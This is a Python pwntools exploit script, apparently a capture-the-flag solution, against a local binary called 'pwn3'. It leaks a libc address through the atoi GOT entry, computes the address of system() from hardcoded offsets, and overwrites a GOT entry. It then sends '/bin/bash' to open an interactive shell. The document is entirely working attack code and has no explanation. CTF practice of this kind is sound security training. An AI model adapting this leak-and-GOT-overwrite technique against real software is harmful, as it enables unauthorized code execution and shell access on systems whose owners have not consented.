from pwn import *
import binascii
p = process("./pwn3_e490be0dae526433cf52559900f18026")
# gdb.attach(p)
printf_got_addr = 0x804a010
atoi_addr = 0x804a02c
name_addr = 0x804b008

def leak():
    payload = "12345678aaa\n" + p32(atoi_addr) + "\nbbb\n"
    p.send("1234567\n")
    p.recvuntil("=>")
    p.send("5\n")
    p.recvuntil("=>")
    p.send("1\n")
    p.recvuntil("ID.")
    p.send(payload)
    p.recvuntil("=>")
    p.send("4\n")
    p.recvuntil("your  team's name:")
    return p.recvuntil("\n")[1:5]
    # print binascii.hexlify(p.recvuntil("\n")[1:5])

def attack(system_addr):
    payload = p32(system_addr) + "\n"
    p.send("2\n")
    p.send("5\n") #length
    p.send("3\n")
    p.send(payload)
    p.send("1\n")
    p.send("/bin/bash\n")
    p.interactive()

libc_addr = u32(leak()) - 0x2d250
system_addr = libc_addr + 0x0003ada0
print hex(system_addr)
attack(system_addr)
